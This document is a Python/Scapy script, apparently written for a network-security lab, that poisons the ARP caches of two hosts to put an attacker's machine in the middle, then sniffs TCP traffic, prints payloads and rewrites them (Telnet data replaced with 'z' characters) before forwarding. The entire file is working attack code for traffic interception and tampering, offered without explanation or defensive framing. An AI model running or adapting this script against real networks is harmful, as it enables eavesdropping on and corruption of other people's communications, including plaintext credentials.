from scapy.all import Ether, ARP, sendp, sniff, IP, TCP, Raw
from Hosts import IP_Host_A, IP_Host_B, Mac_Host_A, Mac_Host_B, Mac_Attacker
import threading
import time

# Function to send ARP spoofing requests continuously
def send_arp_requests():
    def arp_request(src_ip, dst_ip, src_mac, dst_mac):
        E = Ether(dst=dst_mac, src=src_mac)
        A = ARP(op=1, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac)
        pkt = E/A
        return pkt

    while True:
        try:
            pkt_A = arp_request(IP_Host_B, IP_Host_A, Mac_Attacker, Mac_Host_A)
            sendp(pkt_A, verbose=False, iface="eth0")
            
            pkt_B = arp_request(IP_Host_A, IP_Host_B, Mac_Attacker, Mac_Host_B)
            sendp(pkt_B, verbose=False, iface="eth0")

            time.sleep(2)  # Prevent flooding the network
        except Exception as e:
            print(f"Error in ARP spoofing: {e}")

# Function to modify and forward packets
def modify_telnet_payload(pkt):
    # Check if the packet has an Ethernet layer
    if pkt.haslayer(Ether):
        # Forward packets from Host A to Host B
        if pkt[Ether].src ==  Mac_Attacker:
            return
        elif pkt[Ether].src == Mac_Host_A and pkt[Ether].dst == Mac_Attacker:
            pkt[Ether].dst = Mac_Host_B  # Change destination MAC to Host B
            pkt[Ether].src = Mac_Attacker  # Change source MAC to attacker's MAC

        # Forward packets from Host B to Host A
        elif pkt[Ether].src == Mac_Host_B and pkt[Ether].dst == Mac_Attacker:
            pkt[Ether].dst = Mac_Host_A  # Change destination MAC to Host A
            pkt[Ether].src = Mac_Attacker  # Change source MAC to attacker's MAC
        
        
        # Check if the packet has a Raw layer (TCP payload)
        if pkt.haslayer(Raw):
            # Get the original payload
            original_payload = pkt[Raw].load
            print(f"Original Payload: {original_payload}")
            pkt.show()
            
            if pkt[TCP].dport == 23 or pkt[TCP].sport == 23:
                # Modify the payload (replace all characters with "z")
                modified_payload = b"z" * len(original_payload)
                pkt[Raw].load = modified_payload

                print(f"Modified Payload: {pkt[Raw].load}")
            else:               
                print("NOT Telnet")
                # Extract the first byte (character) of the original payload
                first_char = original_payload[0:1]
                
                # Create a modified payload by repeating the first character
                modified_payload = first_char * (len(original_payload) - 1)
                modified_payload += b'\n'
                
                # Replace the payload in the packet
                pkt[Raw].load = modified_payload
                
                print(f"Modified Payload: {pkt[Raw].load}")
                
        # Delete checksums to force recalculation
        if pkt.haslayer(IP):
            del pkt[IP].chksum
        if pkt.haslayer(TCP):
            del pkt[TCP].chksum

        # Send the modified packet
        sendp(pkt, verbose=False, iface="eth0")

# Function to sniff TCP packets
def sniff_tcp_packets():
    sniff(iface="eth0", filter="tcp", prn=modify_telnet_payload)

# Start ARP spoofing in a separate thread
arp_thread = threading.Thread(target=send_arp_requests, daemon=True)
arp_thread.start()

# Start sniffing TCP packets
sniff_tcp_packets()